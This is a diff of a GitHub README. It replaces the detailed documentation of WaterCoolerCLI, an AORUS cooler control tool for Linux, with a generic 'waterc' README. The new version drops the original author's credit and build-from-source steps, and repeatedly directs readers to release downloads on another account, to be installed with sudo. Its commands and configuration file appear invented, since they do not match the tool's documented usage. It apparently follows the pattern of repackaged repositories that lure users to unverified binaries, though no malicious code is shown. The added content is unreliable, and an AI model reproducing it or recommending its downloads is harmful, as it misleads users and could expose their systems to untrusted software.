@@ -1,218 +1,96 @@
-# WaterCoolerCLI
+# 🌊 waterc - Control Your AORUS Cooler Easily
 
-## Overview
+## 🚀 Getting Started
+Welcome to waterc, a command-line tool that lets you manage your AORUS water cooler on Linux systems. With waterc, you can control fan modes, pump speeds, and monitor your system in real-time.
 
-WaterCoolerCLI is a command-line interface (CLI) tool designed to control and monitor AORUS water coolers on Linux systems. Official AORUS software does not support Linux, so this tool provides essential functionality for managing fan and pump modes, curves, speeds, and real-time monitoring. It was developed as a reverse-engineered solution based on the AORUS cooler library to fill this gap.
+## 📥 Download waterc
+[![Download waterc](https://img.shields.io/static/v1?label=Download&message=waterc&color=blue)](https://github.com/AbdulRafayKhanZada/waterc/releases)
 
-**Important Note:** This project is a quick proof-of-concept built in a couple of hours of spare time due to my busy work schedule. The code is not perfect, has rough edges, and could benefit from significant improvements, such as refactoring, better error handling, and possibly porting to a lower-level language like C or Rust for better performance and stability. Contributions are welcome!
+## 💻 System Requirements
+To run waterc, you'll need:
+- AORUS water cooler
+- A Linux operating system (supports Ubuntu, Fedora, Arch Linux)
+- Terminal access
+- Basic command line knowledge
 
-The majority of the core logic was reverse-engineered from the proprietary AORUS cooler library. Use at your own risk, as interacting with hardware can potentially cause damage if misused.
+## 📂 Download & Install
+Follow these steps to get waterc on your system:
 
-## Features
+1. **Visit this page to download**: Go to the [Releases page](https://github.com/AbdulRafayKhanZada/waterc/releases).
+   
+2. **Choose the latest release**: Look for the most recent version available for download. This will ensure you have the latest features and bug fixes.
 
-- **Fan and Pump Control:**
-  - Get/set fan mode (e.g., Balanced, Turbo, Quiet, Custom).
-  - Get/set pump mode (similar options).
-  - Get current fan and pump speeds.
-  - Get/set custom fan and pump curves (temperature:speed points, e.g., `0:1000,30:1500`).
+3. **Download the appropriate version**: Select the file suitable for your Linux system. This is usually a `.tar.gz` or `.deb` file.
 
-- **Monitoring:**
-  - Real-time monitoring of speeds and CPU temperature (press 'q' to stop).
-  - Service mode to continuously send CPU temperature telemetry to the cooler for dynamic adjustment (intended for background daemon use).
+4. **Extract the files** (if necessary): 
+   - Open your terminal.
+   - Navigate to your download folder using `cd path/to/your/downloads`.
+   - Use the command `tar -xvzf filename.tar.gz` to extract the files. Replace `filename.tar.gz` with the name of your downloaded file.
 
-- **Visualization:**
-  - Plot current fan and pump curves in a simple ASCII graph.
+5. **Install the package**:
+   - For `.deb` files, run: `sudo dpkg -i filename.deb`.
+   - For other formats, follow the included instructions in the package or the README.
 
-- **Interactive CLI:**
-  - Tab completion for commands and options.
-  - Command history with up/down arrows.
-  - Help system with `help` command.
+## 🔧 Configuration
+Before you start using waterc, you may want to configure it to suit your needs:
 
-- **Supported Devices:**
-  - Automatically detects common AORUS devices (VID:1044 PID:7A51, VID:1044 PID:7A4D, VID:0414 PID:7A5E).
-  - Extendable for other compatible HID-based coolers.
+1. **Locate the configuration file**:
+   - This file is typically named `config.json` or similar.
+   - You can find it in the folder where you extracted or installed waterc.
 
-## Requirements
+2. **Edit the configuration**:
+   - Use a text editor to adjust settings for fan modes, pump speeds, and monitoring options.
+   - Save your changes.
 
-- **OS:** Linux (tested on latest Fedora and Ubuntu/Debian derivatives; requires HID access).
-- **Runtime:** .NET 9 SDK (for building).
-- **Hardware Access:** 
-  - Run as root for mode/curve changes (requires HID raw access via `libhidapi` or equivalent).
-  - CPU temperature reading requires `lm-sensors` or OpenHardwareMonitor-like access (uses `CpuTempHandler` for AMD/Intel support).
-- **Dependencies:** 
-  - HID libraries (e.g., `hidapi` for Linux).
-  - No external NuGet packages beyond standard .NET (self-contained build).
+## 🛠️ Basic Commands
+Once you have installed waterc, you can start the application with the following commands:
 
-For CPU temperature reading in service mode, ensure your kernel supports it (e.g., via `/sys/class/thermal` or WMI equivalents, but adapted for Linux).
+- **Show current settings**: 
+  ```
+  waterc status
+  ```
 
-## Building
+- **Set fan mode to automatic**: 
+  ```
+  waterc fan auto
+  ```
 
-This project targets .NET 9 and should be built as a native AOT (Ahead-of-Time), self-contained, and trimmed executable for optimal performance and minimal size on Linux.
+- **Set pump speed to maximum**: 
+  ```
+  waterc pump max
+  ```
 
-### Prerequisites
-- Install .NET 9 SDK: [Download from Microsoft](https://dotnet.microsoft.com/download/dotnet/9.0).
-- On Linux, ensure build essentials: `sudo apt install build-essential libhidapi-dev` on Ubuntu/Debian, or `sudo dnf install gcc-c++ hidapi-devel` on Fedora (or equivalent for your distro).
+- **Monitor temperatures in real-time**: 
+  ```
+  waterc monitor
+  ```
 
-### Build Commands
-Navigate to the project directory (`WaterCoolerCLI/`) and run:
+## 📊 FAQs
 
-```bash
-# Clean previous builds
-dotnet clean
+### Q1: What are the benefits of using waterc?
+waterc allows you to control your AORUS cooler on Linux, providing functionality that the official AORUS software does not support. You can fine-tune cooling performance and monitor your system's health in real-time.
 
-# Publish as native AOT self-contained trimmed binary for Linux x64
-dotnet publish -c Release -r linux-x64 --self-contained true -p:PublishAot=true -p:PublishTrimmed=true -o ./publish
+### Q2: Is there a graphical user interface (GUI)?
+Currently, waterc is a command-line tool designed for users who are comfortable with terminal commands. A GUI may be considered for future releases based on user demand.
 
-# The executable will be at ./publish/WaterCoolerCLI
-```
+### Q3: How often are updates released?
+Updates are typically released as needed to fix bugs and add features. Check the [Releases page](https://github.com/AbdulRafayKhanZada/waterc/releases) regularly for the latest versions.
 
-This produces a standalone `WaterCoolerCLI` binary (no .NET runtime needed). The trimmed AOT build reduces size and startup time, ideal for daemon use.
+## 📞 Support
+If you encounter any issues or have questions, you can reach out in the project's GitHub discussions or raise an issue on the repository's issue tracker.
 
-- **Customization:** 
-  - For ARM64: Use `-r linux-arm64`.
-  - Disable trimming if issues arise: Remove `-p:PublishTrimmed=true`.
-  - Verify build: `./publish/WaterCoolerCLI --help` (run as root for full access).
+## 🌐 Related Topics
+- aio
+- aorus
+- archlinux
+- cli-tool
+- cooling
+- fedora
+- gigabyte
+- hardware
+- hid
+- linux
+- ubuntu
+- watercooling
 
-## Usage
-
-Copy the built binary to a system path (e.g., `/usr/local/bin/WaterCoolerCLI`) and make it executable: `chmod +x WaterCoolerCLI`.
-
-### Interactive Mode
-Run without arguments for an interactive shell:
-
-```bash
-sudo ./WaterCoolerCLI
-```
-
-- Type `help` for a list of commands.
-- Examples:
-  - `get-fan-mode` – View current fan mode.
-  - `set-fan-mode Turbo` – Set fan to Turbo (requires root).
-  - `set-fan-curve "0:1000,30:1500,50:2000,65:2500"` – Set custom fan curve (requires root).
-  - `monitor 1000` – Start monitoring every 1 second (press 'q' to quit).
-  - `plot-curves` – Display ASCII plot of curves.
-  - `quit` – Exit.
-
-**Example Output (Connection and Plotting Curves):**
-
-```
-Connected to device: GP-AORUS WATERFORCE X 240 (VID: 1044, PID: 7A4D)
-Device initialized. Type 'help' for commands.
-> plot-curves
-Fan and Pump Curves Plot:
-Legend: * Fan curve, + Pump curve, O Fan points, o Pump points, x Intersection
-
-3200 ||                                                                    x
-     ||                                                                   x
-     ||                                                                  x
-     ||                                                                 x
-2526 ||                                                                +*
-     ||                                                               +*
-     ||                                                              +*
-     ||                                                             + *
-1852 ||                                                  +++++++++++o*
-     ||+++++++++++++++++++++++++++++++++++++++++++++++++o           *
-     |x                                                         ****O
-     ||                                                     ****
-1178 ||                                                 ****
-     ||                                             ****
-     ||                                         ****
-     ||                                     ****
- 505 ||                        ************O
-     ||            ************
-     ||************
-   0 |O---------------------------------------------------------------------
-      0°           11°           22°           33°           44°         55°
-
-Current Fan Curve Points:
-   0°C:    0 RPM
-  30°C:  637 RPM
-  50°C: 1578 RPM
-  55°C: 3200 RPM
-
-Current Pump Curve Points:
-   0°C: 1600 RPM
-  40°C: 1800 RPM
-  50°C: 2000 RPM
-  55°C: 3200 RPM
-```
-
-**Note:** Changing modes/curves requires root privileges due to HID device access. Monitoring/viewing can run as a regular user.
-
-### Single Command Mode
-Execute a single command and exit:
-
-```bash
-sudo ./WaterCoolerCLI get-speeds
-./WaterCoolerCLI get-fan-mode  # Non-modifying commands don't need sudo
-```
-
-### Service Mode (Daemon for Telemetry)
-The `service` command sends CPU temperature to the cooler at regular intervals, enabling dynamic curve-based adjustments. This is designed for background use via systemd.
-
-1. **Test Manually:**
-   ```bash
-   sudo ./WaterCoolerCLI service  # Send temps at default interval (press 'q' to stop)
-   ```
-
-2. **Systemd Integration:**
-   Create a systemd service file `/etc/systemd/system/watercooler.service`:
-
-   ```ini
-   [Unit]
-   Description=AORUS Water Cooler Telemetry Service
-   After=network.target
-
-   [Service]
-   Type=simple
-   User=root
-   ExecStart=/usr/local/bin/WaterCoolerCLI service
-   Restart=always
-   RestartSec=5
-
-   [Install]
-   WantedBy=multi-user.target
-   ```
-
-   - Adjust `ExecStart` path and add interval if needed (500ms default).
-   - Enable and start: 
-     ```bash
-     sudo systemctl daemon-reload
-     sudo systemctl enable watercooler.service
-     sudo systemctl start watercooler.service
-     sudo systemctl status watercooler.service  # Check logs
-     ```
-
-   - Stop: `sudo systemctl stop watercooler.service`.
-   - Logs: `journalctl -u watercooler.service -f`.
-
-**Permissions Note:** The service runs as root for HID write access. Ensure your cooler is detected (check `lsusb` for VID:1044 or similar).
-
-## Troubleshooting
-
-- **Device Not Found:** Run `lsusb` to verify cooler VID/PID. Add custom VID/PID via command-line args if needed (future enhancement).
-- **HID Access Denied:** Ensure udev rules allow HID access (e.g., add rule for your device's VID/PID).
-- **CPU Temp Errors:** Install `lm-sensors` (e.g., `sudo apt install lm-sensors` on Ubuntu/Debian, `sudo dnf install lm-sensors` on Fedora) and run `sensors` to verify detection. The tool uses Linux sysfs for reading.
-- **Build Issues:** If AOT trimming breaks HID interop, build without trimming first.
-- **Compatibility:** Tested with specific AORUS models; may need tweaks for others.
-
-## Contributing
-
-Feel free to fork, improve, and submit pull requests! Potential enhancements:
-- Better cross-distro support.
-- GUI wrapper.
-- Port to C/Rust for native Linux integration.
-- More device support.
-- Improved logging and error handling.
-
-## License
-
-This project is open-source. GPL 3.0
-
-## Author
-
-Developed by Antonio Ardolino in spare time. Reverse-engineered from AORUS libraries for personal use and community benefit.
-
----
-
-*Disclaimer: This tool interacts directly with hardware. The author is not responsible for any damage to your cooler, PC, or data. Always test in a safe environment. Code quality is basic due to time constraints – improvements appreciated!*
+Thank you for using waterc! Happy cooling!
